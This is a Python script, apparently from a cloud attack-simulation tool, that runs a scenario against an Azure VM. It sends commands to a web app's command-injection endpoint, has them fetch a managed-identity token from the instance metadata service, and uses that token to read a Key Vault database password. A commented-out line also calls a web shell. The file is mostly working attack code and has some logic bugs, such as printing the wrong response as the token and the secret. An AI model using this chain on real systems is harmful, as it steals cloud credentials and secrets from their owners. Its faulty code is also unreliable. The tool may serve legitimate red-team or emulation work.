import os
import pyfiglet
import time
import subprocess
import requests
import json
from tqdm import tqdm
from time import sleep
from termcolor import colored
from core.helpers import generate_ssh_key
from core.helpers import loading_animation
from core.helpers import generate_ssh_key

def scenario_6_execute():
    print("-"*30)
    print(colored("Executing Scenraio 6 : Azure Web Exploit, Abuse Managed Identity, Extract Secrets from Key Vault", color="red"))
    loading_animation()
    print("-"*30)

    print(colored("Rolling out Infra", color="red"))
    loading_animation()
    print("-"*30)

    # file_path = "./core/cobra-scenario-6-output.json"
    # if os.path.exists(file_path):
    #     os.remove(file_path)
    #     print("File '{}' found and deleted.".format(file_path))

    # subprocess.call("cd ./scenarios/scenario_6/infra/ && terraform init && terraform apply --auto-approve", shell=True)
    # subprocess.call("cd ./scenarios/scenario_6/infra/ && terraform output -json >> ../../../core/cobra-scenario-6-output.json", shell=True)

    with open("./core/cobra-scenario-6-output.json", "r") as file:
        data = json.load(file)
    
    VM_IP = data["vm_public_ip"]["value"] 
    VAULT_NAME = data["vault_name"]["value"]

    print(colored("Exploiting Web App & Creating a Shell", color="red"))
    loading_animation()
    print("-"*30)
    get_access_token_command = (
    'curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token'
    '?api-version=2019-11-01&resource=https://vault.azure.net" -s | jq -r \'.access_token\' > /tmp/token')

    get_access_token_payload = {"command": get_access_token_command}

    get_vault_secret_command = ('cat /tmp/token')

    get_vault_secret_payload = {"command": get_vault_secret_command}

    response = requests.post(f"http://{VM_IP}:5000/", data=get_access_token_payload)

    access_vault_command = (f'curl -H "Authorization: Bearer $TOKEN" https://{VAULT_NAME}.vault.azure.net/secrets/DatabasePassword?api-version=7.3')

    access_vault_payload = {"command": access_vault_command}

# Check if the request was successful
    if response.status_code == 200:
        response2 = requests.post(f"http://{VM_IP}:5000/", data=get_vault_secret_payload)
        if response2.status_code == 200: 
            token = response.text.strip()
            print("Access Token:", token)

            print(colored("Attempting to access Vault", color="red"))
            loading_animation()
            print("-"*30)

            subprocess.call(f"curl 'http://{VM_IP}:5000/' --data-raw 'command=export TOKEN=$(cat /tmp/token)'", shell=True)

            response3 = requests.post(f"http://{VM_IP}:5000/", data=access_vault_payload)
            if response3.status_code == 200: 
                secret = response.text.strip()
                print("Vault Secret:", secret)
            else:
                print("Error accessing vault", response.status_code, response.text)    
        else: 
            print("Error writing token to temp file", response.status_code, response.text)
    else:
        print("Error:", response.status_code, response.text)


    # print(colored("Download malicious script into remote machine", color="red"))
    # loading_animation()
    # print("-"*30)
    #exit_code = subprocess.call(f"curl --silent --output - 'http://{VM_IP}:8081/shell.jsp?cmd=curl'", shell=True)
    # print(colored("Deploying Web App and service", color="red"))
    # loading_animation()
    # sleep_duration = 60
    # with tqdm(total=sleep_duration, desc="Loading") as pbar:
    #     while sleep_duration > 0:
    #         sleep_interval = min(1, sleep_duration)
    #         sleep(sleep_interval)

    #         pbar.update(sleep_interval)
    #         sleep_duration -= sleep_interval    


    